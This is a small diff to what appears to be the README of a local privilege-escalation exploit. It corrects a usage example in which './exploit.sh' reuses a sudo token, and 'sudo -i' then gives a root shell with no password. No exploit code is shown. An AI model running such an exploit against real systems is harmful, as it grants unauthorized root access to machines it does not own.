@@ -10,7 +10,8 @@ $ sudo whatever
 $ ./exploit.sh # This activates our sudo token.
 .... wait 3 seconds
 $ sudo -i # no password required :)
-# uid=0(root) gid=0(root) groups=0(root)
+# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ## Requirements
